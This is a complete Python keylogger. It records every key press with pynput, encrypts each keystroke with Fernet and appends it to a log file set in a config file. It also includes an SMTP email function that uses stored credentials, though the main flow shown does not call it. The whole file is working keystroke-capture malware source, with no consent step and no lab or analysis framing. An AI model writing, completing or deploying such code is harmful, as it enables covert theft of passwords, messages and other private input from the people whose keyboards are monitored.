import os
import sys
import time
import smtplib
import signal
import threading
import configparser
import logging
from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener
# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)
# Global shutdown flag
shutdown_flag = threading.Event()
# Configuration management
CONFIG_FILE = 'config.ini'
def load_config():
    """Load and validate configuration from file."""
    config = configparser.ConfigParser()
    try:
        if not os.path.exists(CONFIG_FILE):
            raise FileNotFoundError(f"Config file {CONFIG_FILE} not found")
        config.read(CONFIG_FILE)
        # Validate required sections exist
        for section in ['email', 'logging', 'encryption']:
            if section not in config:
                raise ValueError(f"Missing required section: {section}")
        return {
            'email': {
                'from': config.get('email', 'from'),
                'to': config.get('email', 'to'),
                'password': config.get('email', 'password'),
                'smtp_server': config.get('email', 'smtp_server'),
                'smtp_port': config.getint('email', 'smtp_port')
            },
            'logging': {
                'dir': config.get('logging', 'dir'),
                'file': config.get('logging', 'file')
            },
            'encryption': {
                'key': config.get('encryption', 'key')
            }
        }
    except Exception as e:
        logger.error(f"Failed to load configuration: {e}")
        sys.exit(1)
def setup_directories(log_dir):
    """Ensure required directories exist with proper permissions."""
    try:
        if not os.path.exists(log_dir):
            os.makedirs(log_dir, mode=0o700)  # Secure directory permissions
            logger.info(f"Created directory: {log_dir}")
    except Exception as e:
        logger.error(f"Failed to create directory {log_dir}: {e}")
        sys.exit(1)
def send_email(config, subject, body):
    """Send an email with the given subject and body."""
    try:
        with smtplib.SMTP(
            config['email']['smtp_server'],
            config['email']['smtp_port']
        ) as server:
            server.starttls()
            server.login(
                config['email']['from'],
                config['email']['password']
            )
            message = f"Subject: {subject}\n\n{body}"
            server.sendmail(
                config['email']['from'],
                config['email']['to'],
                message
            )
            logger.info("Email sent successfully")
    except Exception as e:
        logger.error(f"Failed to send email: {e}")
def on_press(key, config, cipher_suite):
    """Handle key press events with encryption."""
    try:
        if shutdown_flag.is_set():
            return False  # Stop listener
        log_file = os.path.join(
            config['logging']['dir'],
            config['logging']['file']
        )
        # Convert key to string safely
        try:
            key_str = str(key.char)
        except AttributeError:
            if key == Key.space:
                key_str = " "
            else:
                key_str = f" [{key.name}] "
        # Encrypt and log the keystroke
        encrypted = cipher_suite.encrypt(key_str.encode())
        with open(log_file, 'ab') as f:
            f.write(encrypted + b'\n')
    except Exception as e:
        logger.error(f"Error handling key press: {e}")
def signal_handler(sig, frame):
    """Handle interrupt signals for graceful shutdown."""
    logger.info("Shutdown signal received")
    shutdown_flag.set()
def start_keylogger(config):
    """Start monitoring keyboard input with proper shutdown handling."""
    try:
        log_file = os.path.join(
            config['logging']['dir'],
            config['logging']['file']
        )
        setup_directories(os.path.dirname(log_file))
        # Initialize encryption
        cipher_suite = Fernet(config['encryption']['key'].encode())
        # Register signal handlers
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        with open(log_file, 'ab') as f:
            f.write(f"\n\n--- New Session {time.ctime()} ---\n\n".encode())
        logger.info("Starting keyboard listener (Press Ctrl+C to stop)")
        with Listener(
            on_press=lambda key: on_press(key, config, cipher_suite)
        ) as listener:
            while not shutdown_flag.is_set():
                time.sleep(0.1)
            listener.stop()
        logger.info("Keyboard listener stopped gracefully")
    except Exception as e:
        logger.error(f"Error in keylogger: {e}")
        sys.exit(1)
if __name__ == "__main__":
    config = load_config()
    start_keylogger(config)